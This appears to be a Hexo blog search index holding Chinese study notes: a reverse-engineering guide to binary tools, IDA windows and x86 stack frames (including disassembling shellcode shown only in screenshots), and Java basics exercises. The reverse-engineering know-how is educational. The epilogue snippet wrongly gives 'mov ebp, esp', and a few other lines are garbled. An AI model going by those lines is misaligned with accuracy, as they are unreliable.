<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>IDA Pro操作指南</title>
    <url>/2024/03/25/IDA%20Pro%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="摘要工具"><a href="#摘要工具" class="headerlink" title="摘要工具"></a>摘要工具</h1><h2 id="nm"><a href="#nm" class="headerlink" title="nm"></a>nm</h2><p>将源文件编译成目标文件时，编译器必须嵌入一些全局(外部)符号的位置信息，以便链接器在组合目标文件以创建可执行文件时，能够解析对这些符号的引用。除非被告知要去除最终的可执行文件中的符号，否则，链接器通常会将目标文件中的符号带入最终的可执行文件中。根据nm手册的描述，这一实用工具的目的是“列举目标文件中的符号”。使用rm检查中间目标文件(扩展名为.0的文件，而非可执行文件)时，默认输出结果是在这个文件中声明的任何函数和全局变量的名称。nm实用工具的样本输出如下所示。<br><img src="/image/Pasted image 20240328143925.png" alt="20240328143925.png" /><br>从中可以看到，m列出了每一个符号以及与符号有关的一些信息。其中的字母表示所列举的<br>符号的类型。前面的例子中出现了以下字母，下面逐一解释。<br>U，未定义符号，通常为外部符号引用。<br>T，在文本部分定义的符号，通常为函数名称。<br>t，在文本部分定义的局部符号。在C程序中，这个符号通常等同于一个静态函数。<br>D，已初始化的数据值。<br>C，未初始化的数据值。</p>
<blockquote>
<p>大写字母表示全局符号，小写字母则表示局部符号。请参阅nm手册了解有关字母代码的详细解释。</p>
</blockquote>
<p>如果使用nm列举可执行文件中的符号，将会有更多信息显示出来。在链接过程中，符号被解析成虚拟地址(如有可能)。因此，这时运行nm，将可获得更多信息。<br><img src="/image/Pasted image 20240328143556.png" alt="20240328143556.png" /></p>
<h2 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h2><p>创建可执行文件时，必须解析该文件引用的任何库函数的地址。链接器通过两种方法解析对库函数的调用:静态链接(static linking)和动态链接(dynamic linking)。链接器的命令行参数决定具体使用哪一种方法。一个可执行文件可能为静态链接、动态链接，或二者兼而有之。<br><img src="/image/Pasted image 20240328144501.png" alt="20240328144501.png" /><br>此时查看两种方式编译的可执行文件大小：<br><img src="/image/Pasted image 20240328144929.png" alt="20240328144929.png" /><br>使用ldd查看：<br><img src="/image/Pasted image 20240328145043.png" alt="20240328145043.png" /></p>
<h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><p>objdump可以显示大量目标文件有关的信息，超过30个命令行选项分别查看。</p>
<ul>
<li>节头部，程序文件每节的摘要信息。</li>
<li>专用头部，程序内存分布信息，还有运行时加载器所需的其他信息，包括由ldd等工具生成的库列表。 </li>
<li>调试信息，提取出程序文件中的任何调试信息。 </li>
<li>符号信息，以类似nm的方式转储符号表信息。 </li>
<li>反汇编代码清单，objdump对文件中标记为代码的部分执行线性扫描反汇编。反汇编x86代码时，objdump可以生成AT&amp;T或Intel语法，并可以将反汇编代码保存在文本文件中。这样的文本文件叫做反汇编死代码清单(dead listing)，尽管这些文件可用于实施逆向工程，但它们很难有效导航，也无法以一致且无错的方式被修改。<img src="/image/Pasted image 20240328145445.png" alt="20240328145445.png" /></li>
</ul>
<h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><p>和objdump类似，但不依赖libbfd<br><img src="/image/Pasted image 20240328145617.png" alt="20240328145617.png" /></p>
<h1 id="深度检测工具"><a href="#深度检测工具" class="headerlink" title="深度检测工具"></a>深度检测工具</h1><p>到目前为止，我们已经讨论了一些工具，利用这些工具，可以在对文件的内部结构知之甚少的情况下对文件进行粗略分析,也可以在深入了解文件的结构之后,从文件中提取出特定的信息。在这一节中，我们将介绍一些专用于从任何格式的文件中提取出特定信息的工具。</p>
<h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>有时候，提出一些与文件内容有关的常规性问题，即那些不需要了解文件结构即可回答的问题，对我们会有一定帮助。例如:“这个文件包含字符串吗?”当然，在回答这个问题之前，必须先回答这个问题:“到底什么是字符串?”我们将字符串简单定义为由可打印字符组成的连续字符序列。通常，在这一定义的基础上，还需要指定一个最小长度和一个特定的字符集。因此，可以搜索至少包含4个连续可打印ASCII字符的字符串，并将结果在控制台打印出来。通常，搜索这类字符串不会受到文件结构的限制。在ELF二进制文件中搜索字符串就像在微软Word文档中搜索字符串一样简单。<br><img src="/image/Pasted image 20240328145810.png" alt="20240328145810.png" /></p>
<ul>
<li>需要牢记的是，使用strings处理可执行文件时，默认情况下，strings仅仅扫描文件中可加载的、经初始化的部分。使用命令行参数-a可迫使strings扫描整个文件。</li>
<li>strings不会指出字符串在文件中的位置。使用命令行参数-t可令strings显示所发现的每一个字符串的文件偏移量信息。 </li>
<li>许多文件使用了其他字符集。使用命令行参数-e可使strings搜索更广泛的字符，如16位Unicode字符。</li>
</ul>
<h1 id="反汇编器"><a href="#反汇编器" class="headerlink" title="反汇编器"></a>反汇编器</h1><p>如前所述，有很多工具都可以生成二进制目标文件的死列表形式的反汇编代码。PE、ELF和MACH-0文件可分别使用dupbin、objdump和otoo1进行反汇编。但是，它们中的任何一个都无法处理任意格式的二进制文件。有时候,你会遇到一些并不采用常用文件格式的二进制文件,在这种情况下，就需要一些能够从用户指定的偏移量开始反汇编过程的工具。</p>
<h2 id="ndisasm"><a href="#ndisasm" class="headerlink" title="ndisasm"></a>ndisasm</h2><p>ndisasm是一款用于x86指令集的流式反汇编器，ndisasm属于NASM工具集。</p>
<blockquote>
<p>安装方法：sudo apt-get install nasm</p>
</blockquote>
<p>我们通过VIPER生成一段shellcode，然后进行反编译：<br><img src="/image/Pasted image 20240328155349.png" alt="20240328155349.png" /><br>通过ndisasm进行反编译：<br><img src="/image/Pasted image 20240328160107.png" alt="20240328160107.png" /><br>由于流式反汇编非常灵活，因此它的用途相当广泛。例如，在分析网络数据包中可能包含shellcode的计算机网络攻击时,就可以采用流式反汇编器来反汇编数据包中包含shellcode的部分以分析恶意负载的行为。另外一种情况是分析那些格式未知的ROM镜像。ROM中有些部分是数据，其他部分则为代码，可以使用流式反汇编器来反汇编镜像中的代码。</p>
<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="主要数据显示窗口"><a href="#主要数据显示窗口" class="headerlink" title="主要数据显示窗口"></a>主要数据显示窗口</h2><h3 id="Names窗口"><a href="#Names窗口" class="headerlink" title="Names窗口"></a>Names窗口</h3><img src="/image/Pasted image 20240329101313.png" alt="20240329101313.png" />
### 反汇编窗口（IDA-View）
反汇编窗口有两种显示格式:
面向文本的列表视图和自IDA5.0开始的引入的基于图形的视图。多数IDA用户会有所偏好，具体使用哪一种视图，要由用户的喜好决定。首次启动IDA时，用户会发现，默认情况下，反汇编窗口以图形视图显示。要更改这个默认设置，可以取消选中Options》General对话框的Graph选项卡下的Use graph viewbydefault(默认使用图形视图)选项。
## 次要IDA显示窗口
### 导出/导入窗口
导出窗口列出文件的入口点。这包括程序的执行入口点(在程序的文件头部分指定)，以及任何由文件导出给其他文件使用的函数和变量。通常，用户可在共享库(如WindowsDLL文件)中找到导出的函数。导出的项目按名称、虚拟地址和序数(如果可用)排列。对于可执行文件，导出窗口中至少包含一个项目:程序的执行入口点，IDA将这个入口点取名为start。
<img src="/image/Pasted image 20240329100121.png" alt="20240329100121.png" />
导入窗口列出二进制文件导入的所有函数，只有在二进制文件使用共享库时，IDA才需要用到导入窗口。静态链接的二进制文件不存在外部依赖关系，因此不需要导入其他内容。导入窗口中的每个条目列出一个导入项目(函数或数据)的名称，以及包含该项目的库的名称。由于被导入的函数的代码位于共享库中，窗口中每个条目列出的地址为相关导入表条目"的虚拟地址。
<img src="/image/Pasted image 20240329100136.png" alt="20240329100136.png" />
### 结构体窗口
结构体窗口用于显示IDA决定在一个二进制文件中使用的任何复杂的数据结构(如C结构体和联合)的布局。在分析阶段，IDA会查询它的函数类型签名扩展库，设法将函数的参数类型与程序使用的内存匹配起来。
<img src="/image/Pasted image 20240329100924.png" alt="20240329100924.png" />
### 枚举窗口
枚举窗口有点类似于结构体窗口。如果IDA检测到标准枚举数据类型(Cenum)，它将在举窗口中列出该数据类型。你可以使用枚举来代替整数常量，提高反汇编代码的可读性。像结构体窗口一样，在枚举窗口中也可以定义自己的枚举类型，并将其用在经过反汇编的二进制代码中。
## 其他IDA显示窗口
### 段窗口
段窗口显示的是在二进制文件中出现的段的简要列表。需要注意的在，在讨论二进制文件的结构时，IDA术语“段”(segment)常称为“节”(section)。请不要将这里的术语“段”与实施分段内存体系结构的CPU中的内存段混淆。该窗口中显示的信息包括段名称、起始和结束地址以及许可标志。起始和结束地址代表程序段在运行时对应的虚拟地址范围。
<img src="/image/Pasted image 20240329101537.png" alt="20240329101537.png" />
### 签名窗口Signatures
IDA利用一个庞大的签名库来识别已知的代码块。签名用于识别由编译器生成的常用启动顺
序，以确定可能已被用来构建给定二进制文件的编译器。签名还可用于将函数划归为由编译器插
入的已知库函数，或者因为静态链接而添加到二进制文件中的函数。
# 反汇编导航
## 基本IDA导航
### 双击导航
反汇编一个程序时，程序的每个位置都分配到了一个虚拟地址。因此，只要提供希望访问的位置的虚拟地址，就可以导航到程序的任何地方。遗憾的是，对我们而言，记住大量地址并非易事。这促使早期程序员给他们希望引用的程序位置分配符号名称，这大大简化了他们的工作。给程序地址分配符号名称，与给程序操作码分配助记指令名称并无不同。由于程序更易于记忆，读取和写入程序也更加方便。
### 跳转到地址
使用Jump》Jump to Address命令或在反汇编窗口中按下热键G，均可以打开Jump to Address对话框。如果把这个对话框看成Go对话框，可能有助于你记住相关的热键。要想导航到二进制文件中的某个位置，只需指定一个地址(名称或十六进制值)，然后单击OK，IDA会立即显示你指定的位置。IDA会记住你在这个对话框中输入的值，并通过一个下拉列表显示，以方便你随后使用。使用这项历史记录功能，你可以迅速返回你之前访问过的位置。
<img src="/image/Pasted image 20240329103100.png" alt="20240329103100.png" />
## 栈帧
**栈帧**(**stackfame**)一种低级概念。栈帧是在程序的运行时栈中分配的内存块，专门用于特定的函数调用。程序员通常会将可执行语句分组，划分成叫做函数(也称过程、子例程或方法)的单元。有时候，这样做是遵照所使用的语言的要求。多数情况下，以这些函数单元为基础构建程序是一种良好的编程实践。
如果一个函数并未执行，通常它并不需要内存。但是，当函数被调用时，它就可能因为某种原因需要用到内存。这源于几方面的原因。其一，函数的调用方可能希望以参数的方式向该函数传递信息，这些参数需要存储在某个地方，以方便函数查找它们。其二，在执行任务的过程中，函数可能需要临时的存储空间。程序员通常会通过声明局部变量来分配这类临时空间，这些变量将在函数执行过程中使用，但一旦完成函数调用，就无法再访问它们。
### 局部变量布局
#### 栈帧示例
以下面32位编译的函数为例：
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">int</span> j, <span class="type">int</span> k)</span>&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demo_stackframe</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span>&#123;</span><br><span class="line">        <span class="type">int</span> x = a;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">        <span class="type">int</span> y = b;</span><br><span class="line">        <span class="type">int</span> z = c;</span><br><span class="line"></span><br><span class="line">        bar(z,y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        demo_stackframe(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以计算到，局部变量最少需要76个字节的栈空间（4\*3+64=76）
这个函数可能使用stdcall或者cdecl调用约定，我们分为两种情况来分析
未使用帧指针寄存器/基址指针寄存器EBP，因此使用ESP作为帧指针，通过以下命令编译：
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">gcc -m32 -O0 -fno-stack-protector -fno-pie -no-pie -fcf-protection=none -fomit-frame-pointer stack_frame.c -o b.out    <span class="comment">#-fomit-frame-pointer指定不使用EBP</span></span><br></pre></td></tr></table></figure>
使用帧指针寄存器/基址指针寄存器EBP：
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">gcc -m32 -O0 -fno-stack-protector -fno-pie -no-pie -fcf-protection=none stack_frame.c -o a.out</span><br></pre></td></tr></table></figure>
<img src="/image/Pasted image 20240329173300.png" alt="20240329173300.png" />
分别反编译分析一下
##### 未使用EBP
<img src="/image/Pasted image 20240329173435.png" alt="20240329173435.png" />
可以看到进入demo函数后栈顶指针向低地址申请了80个字节的空间。
> Q：为什么是80个字节而不是76个字节？
> A：在大多数现代操作系统和编译器中，局部变量通常存储在栈（stack）上。关于栈空间的分配和对齐，可能受到一些特定规则的影响。
> **有些硬件架构可能要求数据对齐到特定的边界以提高访问效率。例如，某些处理器可能要求4字节对齐或8字节对齐的数据访问。在这种情况下，编译器可能会自动调整局部变量的对齐，以确保它们满足硬件的要求。**
> 此外，编译器优化也可能影响栈空间的分配和对齐。编译器可能会进行内联优化、寄存器分配等优化操作，这些操作可能会影响局部变量在栈上的布局和大小。

<p>此时分析一下栈的情况：<br><img src="/image/Pasted image 20240329175450.png" alt="20240329175450.png" /><br>我们可以清楚的看出此时的栈帧</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>偏移量</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>z</td>
<td>[esp]</td>
<td>局</td>
</tr>
<tr>
<td>y</td>
<td>[esp+4]</td>
<td>部</td>
</tr>
<tr>
<td>buffer</td>
<td>[esp+8]</td>
<td></td>
</tr>
<tr>
<td>x</td>
<td>[esp+72]</td>
<td>变</td>
</tr>
<tr>
<td>padding(可能存在)</td>
<td>[esp+76]</td>
<td>量</td>
</tr>
<tr>
<td>saved eip</td>
<td>[esp+80]</td>
<td>—–</td>
</tr>
<tr>
<td>a</td>
<td>[esp+84]</td>
<td>参</td>
</tr>
<tr>
<td>b</td>
<td>[esp+88]</td>
<td></td>
</tr>
<tr>
<td>c</td>
<td>[esp+92]</td>
<td>数</td>
</tr>
<tr>
<td>最后收尾部分返回调用函数的时候需要从从栈顶弹出所需返回地址，也就是保存的eip指令：</td>
<td></td>
<td></td>
</tr>
<tr>
<td><img src="/image/Pasted image 20240329181320.png" alt="20240329181320.png" /></td>
<td></td>
<td></td>
</tr>
<tr>
<td>计算一下正好是88个字节，回收了这些地址：</td>
<td></td>
<td></td>
</tr>
<tr>
<td><img src="/image/Pasted image 20240329181155.png" alt="20240329181155.png" /></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h5 id="使用EBP"><a href="#使用EBP" class="headerlink" title="使用EBP"></a>使用EBP</h5><p>我们同样跟进到demo_stackframe函数：<br><img src="/image/Pasted image 20240329181641.png" alt="20240329181641.png" /><br>同样是申请了80字节的空间，不过前面多了两步操作栈底指针和栈顶指针的步骤。<br>此时我们来分析一下栈帧的情况：<br><img src="/image/Pasted image 20240329181906.png" alt="20240329181906.png" /><br>可以看到大致上是和之前差不多的，只不过这里多了4个字节的保存的ebp的地址<br>这里使用一个专用的帧指针,所有变量相对于帧指针寄存器的偏移量得以计算出来。<strong>许多时候(尽管并无要求)，正偏移量用于访问函数参数，而负偏移量则用于访问局部变量。</strong> 使用专用的指针，我们可以自由更改栈指针，而不至影响帧内其他变量的偏移量。<br>调用bar函数后来到收尾部分，在使用EBP的程序中返回原函数地址的步骤有所不同，一般的步骤有以下两条指令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov    ebp, esp</span><br><span class="line">pop    ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>因为非常常用，所以x86体系提供了一个新的指令leave来直接完成这个操作<br><img src="/image/Pasted image 20240329184027.png" alt="20240329184027.png" /></p>
<h3 id="IDA栈视图"><a href="#IDA栈视图" class="headerlink" title="IDA栈视图"></a>IDA栈视图</h3><p>很明显，栈帧是一个运行时概念，没有栈和运行中的程序，栈帧就不可能存在。话虽如此，但这并不意味着你在使用IDA之类的工具进行静态分析时，就可以忽略栈帧的概念。二进制文件中包含配置每个函数的栈帧所需的全部代码。通过仔细分析这段代码，我们可以深入了解任何承数的栈帧的结构，即使这个函数并未运行。<br>我们以gcc编译的以下函数为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demo_stackframe</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span>&#123;</span><br><span class="line">	<span class="type">int</span> x = c;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">	<span class="type">int</span> y = b;</span><br><span class="line">	<span class="type">int</span> z = <span class="number">10</span>;</span><br><span class="line">	buffer[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">	bar(z, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	demo_stackframe(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们可以提前预估一下需要的栈空间（4+64+4+4&#x3D;76）</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记</title>
    <url>/2023/03/06/Java%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="Intellij快捷关键字"><a href="#Intellij快捷关键字" class="headerlink" title="Intellij快捷关键字"></a>Intellij快捷关键字</h2><p>sout：快速生成system.out输出语句</p>
<p>100.fori：以变量i为计数快速生成循环100次的for循环</p>
<p>数组名.fori：以变量i为计数快速生成遍历数组的循环</p>
<p>psvm：快速生成静态main方法</p>
<p>Ctrl + Alt + M：快速从代码中提取方法并生成方法</p>
<p>Alt + INSERT -&gt; Constructor：快速生成构造函数</p>
<p>Alt + INSERT -&gt; getter and setter：快速生成JavaBean的设置器和获取器</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="加"><a href="#加" class="headerlink" title="加"></a>加</h3><p><strong>数字相加：</strong>直接运算，遵从隐式转换规则；</p>
<p><strong>字符串相加：</strong>只要有字符串参与运算时，就变成连接符，不再进行加运算；从左到右逐个执行；</p>
<p><strong>字符相加：</strong>字符之间或与数字进行运算时，会先转换为对应的ascii码值再进行运算：<code>1 + &#39;a&#39; = 98</code>；</p>
<h3 id="自增自减"><a href="#自增自减" class="headerlink" title="自增自减"></a>自增自减</h3><ul>
<li>单独一行使用时++a和a++相同</li>
<li>参与了计算时，++a先运算再赋值，a++先赋值再运算</li>
</ul>
<h3 id="拓展赋值运算符-、-等"><a href="#拓展赋值运算符-、-等" class="headerlink" title="拓展赋值运算符+&#x3D;、-&#x3D;等"></a>拓展赋值运算符+&#x3D;、-&#x3D;等</h3><ul>
<li>先将左边与右边进行运算，再赋值给左边：<code>a += 1</code>  》 <code>a = a + 1</code></li>
<li>包含了强制类型转换：<code>short a = 1; a += 1;</code> 相当于 <code>a = (short)(a + 1);</code></li>
</ul>
<h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><ul>
<li>&#x3D;&#x3D;、!&#x3D;、&gt;&#x3D;、&lt;&#x3D;等</li>
<li>最后的值都是布尔类型</li>
</ul>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ul>
<li><code>&amp;</code>：两边都true才为true；<code>|</code>：两边都false才为false；<code>^</code>：两边相同则为false，不同则为true；<code>!</code>：取相反值；</li>
</ul>
<h3 id="短路逻辑运算"><a href="#短路逻辑运算" class="headerlink" title="短路逻辑运算"></a>短路逻辑运算</h3><ul>
<li><code>&amp;&amp;</code>和<code>||</code>，先判断左边的条件，如果已经能确定最终结果了（注意：逻辑与，左边为false，则整句为false；逻辑或，左边为true，则整句为true），则右边直接不参与执行（如果有自增运算符则不会生效），起到了短路的效果，可以提高程序运行效率</li>
</ul>
<img src="/image/image-20230211172910961.png" alt="image-20230211172910961" style="zoom: 50%;" />

<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><img src="/image/image-20230211174212690.png" alt="image-20230211174212690" style="zoom: 67%;" />

<ul>
<li>小括号优先级最高</li>
</ul>
<h3 id="原码补码反码"><a href="#原码补码反码" class="headerlink" title="原码补码反码"></a>原码补码反码</h3><ul>
<li><p>原码：十进制数据的二进制表现，最左边一位符号位（0正1负），计算规则：<code>8(00001000) + 1 = 9(00001001)</code>；但在计算负数时<code>-1(10000001) + 1 = -2(10000010)</code>会产生错误的结果</p>
</li>
<li><p>反码：为了解决原码计算负数会出错的问题，计算规则：正数反码不变，负数符号位不变，数值取反（0&#x2F;1互换），原码<code>-7(10000111)</code>取反码<code>-7(11111000)</code>计算<code>-7(11111000) + 1 = (11111001)</code>再取反码<code>-6(10000110)</code>，最终得到正确结果；但在跨零的时候<code>-0(10000000) + 1 = +0(00000000)</code>仍然会产生错误的结果</p>
</li>
<li><p>补码：解决0有两种表现形式（10000000&#x2F;00000000）产生的报错，计算规则：在反码的基础上往前进1，原码<code>-4(10000100)</code>反码<code>11111011</code>补码<code>-4(11111100) + 5 = 1(00000001)</code>；特殊：-128只有补码，没有原码和补码；计算机中的存储和计算都是以补码的形式</p>
</li>
</ul>
<h3 id="按位运算符"><a href="#按位运算符" class="headerlink" title="按位运算符"></a>按位运算符</h3><ul>
<li>逻辑与：按二进制位进行逻辑与运算，位数不够补0，<code>200 &amp; 10 = 11001000 &amp; 00001010 = 00001000 = 8</code>；逻辑或同理</li>
<li>左移：二进制位向左移动，低位补零：<code>200 &lt;&lt; 2 = 0000|11001000 &lt;&lt; 2 = 0011|00100000 = 800</code>；右移反之，高位补0或者1（正负数不同）；无符号右移一律补零</li>
</ul>
<h2 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h2><ul>
<li><p>自动数据转换，取值范围小的数据类型自动向取值范围大的数据类型转换</p>
</li>
<li><p><code>byte &lt; shot &lt; int &lt; long &lt; float &lt; double</code></p>
</li>
<li><p>byte、short、char类型进行运算时都会先转换成int类型再进行运算</p>
</li>
</ul>
<h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><ul>
<li>int a &#x3D; (int)String</li>
<li>数据会有一定程度的损失</li>
</ul>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><img src="/image/image-20220429122054874.png" alt="image-20220429122054874" style="zoom:80%;" />

<ul>
<li>default为默认的分支，可以写在任意位置，但需要保证程序可读性</li>
<li>break可以跳出switch分支，如果不写可能导致case穿透（执行完了对应case没有break，会继续向下执行case里面的语句，直到结束或发现break），但在某些情况下也可以利用case穿透来简化代码，例如上图</li>
<li>JDK12新特性：可以在case后面使用<code>case 1 -&gt; &#123;语句&#125;</code>，可以省略break只执行大括号里的语句</li>
</ul>
<h3 id="循环语句中的思想"><a href="#循环语句中的思想" class="headerlink" title="循环语句中的思想"></a>循环语句中的思想</h3><ul>
<li>循环次数快速判断：<code>i = 1; i &lt;= 5; i++;</code>时循环五次，<code>i = 1; i &lt; 5; i++;</code>时循环四次；<strong>带等加一，不等不变</strong>；</li>
<li>累加思想；设定一个统计变量用以计数，如count，决定循环次数</li>
<li>知道循环次数用for，不确定循环次数可以用while</li>
</ul>
<h3 id="while循环和for循环"><a href="#while循环和for循环" class="headerlink" title="while循环和for循环"></a>while循环和for循环</h3><img src="/image/image-20230215170714711.png" alt="image-20230215170714711" style="zoom:80%;" />

<img src="/image/image-20230215170801089.png" alt="image-20230215170801089" style="zoom:80%;" />

<img src="/image/image-20230215170943203.png" alt="image-20230215170943203" style="zoom:80%;" />

<h3 id="算法练习——回文数"><a href="#算法练习——回文数" class="headerlink" title="算法练习——回文数"></a>算法练习——回文数</h3><img src="/image/image-20230215174449863.png" alt="image-20230215174449863" style="zoom:80%;" />

<ul>
<li>获取对应位数上的数字，个位：<code>x % 10</code>，十位：<code>x / 10 % 10</code>，百位：<code>x / 100 % 10</code>，以此类推</li>
<li>获取倒序数字：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;              <span class="comment">//通过循环，从右到左逐位获取数字</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">ge</span> <span class="operator">=</span> x % <span class="number">10</span>;        <span class="comment">//获取个位数，此时ge=5</span></span><br><span class="line">            x = x / <span class="number">10</span>;             <span class="comment">//获取倒数第二个数字，这一步是为了去掉已经记录的个位数，此时x=1234</span></span><br><span class="line">            num = num * <span class="number">10</span> + ge;    <span class="comment">//这一步乘10是为了把最右边的个位数换到最前面，此时num=5</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;x的倒序数为：&quot;</span> + num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法练习——不使用-求商和余数"><a href="#算法练习——不使用-求商和余数" class="headerlink" title="算法练习——不使用*&#x2F;%求商和余数"></a>算法练习——不使用*&#x2F;%求商和余数</h3><img src="/image/image-20230215181747911.png" alt="image-20230215181747911" style="zoom:80%;" />

<ul>
<li>思路：可以使用循环来递减，通过减的次数来得到商和余数，只要被除数≥除数就一直循环</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">chued</span> <span class="operator">=</span> <span class="number">101</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">chu</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">shang</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">yu</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (chued &gt;= chu)&#123;</span><br><span class="line">            chued = chued - chu;</span><br><span class="line">            yu = chued;</span><br><span class="line">            shang++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;商：&quot;</span> + shang);</span><br><span class="line">        System.out.println(<span class="string">&quot;余数：&quot;</span> + yu);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跳转控制语句"><a href="#跳转控制语句" class="headerlink" title="跳转控制语句"></a>跳转控制语句</h3><ul>
<li>continue：停止本次循环，直接进入下次循环</li>
<li>break：停止整个循环</li>
</ul>
<h3 id="算法练习——求平方根"><a href="#算法练习——求平方根" class="headerlink" title="算法练习——求平方根"></a>算法练习——求平方根</h3><img src="/image/image-20230215184127824.png" alt="image-20230215184127824" style="zoom:80%;" />

<ul>
<li>思路：从1开始循环，用i的平方跟目标数字进行比较，如果一样就是平方根；如果小于就继续往后判断；如果大于，那么前一个数字i-1就是平方根的整数部分</li>
</ul>
<h3 id="算法练习——判断质数"><a href="#算法练习——判断质数" class="headerlink" title="算法练习——判断质数"></a>算法练习——判断质数</h3><ul>
<li>思路：质数只能被1和本身整除；写一个循环，从2开始，到number-1为止，一直用这个数和number求余，遇到余数为0的时候就说明能被其他数整除，结束整个循环，并说明该数不是质数，否则一直循环下去直到自然结束，说明该数是质数；<strong>设置一个flag</strong>，初始为true，用以确认循环中是否有某一次被其他数整除，如果有就标记flag为false，最后通过flag进行判断</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; number; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>)&#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                System.out.println(number+<span class="string">&quot;不是质数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span 